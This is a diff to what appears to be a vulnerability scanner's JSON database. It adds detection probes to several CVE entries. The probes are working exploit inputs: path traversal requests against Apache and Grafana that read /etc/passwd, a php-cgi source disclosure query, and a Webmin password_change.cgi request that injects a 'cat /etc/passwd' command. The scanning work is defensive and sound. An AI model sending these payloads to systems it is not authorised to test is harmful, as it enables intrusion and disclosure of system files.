@@ -133,13 +133,37 @@
         "cve": "CVE-2021-41773",
         "affected": "==2.4.49",
         "cvss": 9.8,
-        "summary": "Path traversal and file disclosure when mod_cgi is enabled (RCE possible)"
+        "summary": "Path traversal and file disclosure when mod_cgi is enabled (RCE possible)",
+        "check": {
+          "probes": [
+            {
+              "path": "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+              "markers": ["root:x:0:0:", "root:*:0:0:"]
+            },
+            {
+              "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+              "markers": ["root:x:0:0:", "root:*:0:0:"]
+            }
+          ]
+        }
       },
       {
         "cve": "CVE-2021-42013",
         "affected": "==2.4.50",
         "cvss": 9.8,
-        "summary": "Incomplete fix of CVE-2021-41773: path traversal with double URL encoding, RCE with mod_cgi"
+        "summary": "Incomplete fix of CVE-2021-41773: path traversal with double URL encoding, RCE with mod_cgi",
+        "check": {
+          "probes": [
+            {
+              "path": "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+              "markers": ["root:x:0:0:", "root:*:0:0:"]
+            },
+            {
+              "path": "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+              "markers": ["root:x:0:0:", "root:*:0:0:"]
+            }
+          ]
+        }
       },
       {
         "cve": "CVE-2017-9798",
@@ -601,13 +625,37 @@
         "cve": "CVE-2012-1823",
         "affected": ">=5.3 <5.3.12",
         "cvss": 7.5,
-        "summary": "php-cgi accepts command line switches from the query string, leading to source disclosure and code execution"
+        "summary": "php-cgi accepts command line switches from the query string, leading to source disclosure and code execution",
+        "check": {
+          "probes": [
+            {
+              "path": "/index.php?-s",
+              "markers": ["<code><span style=\"color: #000000\">", "&lt;?php"]
+            },
+            {
+              "path": "/?-s",
+              "markers": ["<code><span style=\"color: #000000\">", "&lt;?php"]
+            }
+          ]
+        }
       },
       {
         "cve": "CVE-2012-1823",
         "affected": ">=5.4 <5.4.2",
         "cvss": 7.5,
-        "summary": "php-cgi accepts command line switches from the query string, leading to source disclosure and code execution"
+        "summary": "php-cgi accepts command line switches from the query string, leading to source disclosure and code execution",
+        "check": {
+          "probes": [
+            {
+              "path": "/index.php?-s",
+              "markers": ["<code><span style=\"color: #000000\">", "&lt;?php"]
+            },
+            {
+              "path": "/?-s",
+              "markers": ["<code><span style=\"color: #000000\">", "&lt;?php"]
+            }
+          ]
+        }
       },
       {
         "cve": "CVE-2015-6835",
@@ -679,7 +727,19 @@
         "cve": "CVE-2021-43798",
         "affected": "<8.3.1",
         "cvss": 7.5,
-        "summary": "Path traversal in /public/plugins/<plugin>/../.. serves arbitrary files, including the SQLite database with secrets"
+        "summary": "Path traversal in /public/plugins/<plugin>/../.. serves arbitrary files, including the SQLite database with secrets",
+        "check": {
+          "probes": [
+            {
+              "path": "/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+              "markers": ["root:x:0:0:", "root:*:0:0:"]
+            },
+            {
+              "path": "/public/plugins/graph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+              "markers": ["root:x:0:0:", "root:*:0:0:"]
+            }
+          ]
+        }
       },
       {
         "cve": "CVE-2020-13379",
@@ -733,7 +793,17 @@
         "cve": "CVE-2019-15107",
         "affected": "<1.920",
         "cvss": 10.0,
-        "summary": "password_change.cgi command injection gives unauthenticated remote code execution as root"
+        "summary": "password_change.cgi command injection gives unauthenticated remote code execution as root",
+        "check": {
+          "probes": [
+            {
+              "method": "POST",
+              "path": "/password_change.cgi",
+              "body": "user=root&pam=&expired=2&new1=slntest&new2=slntest&old=slntest%3B%20cat%20%2Fetc%2Fpasswd",
+              "markers": ["root:x:0:0:", "root:*:0:0:"]
+            }
+          ]
+        }
       },
       {
         "cve": "CVE-2020-12662",
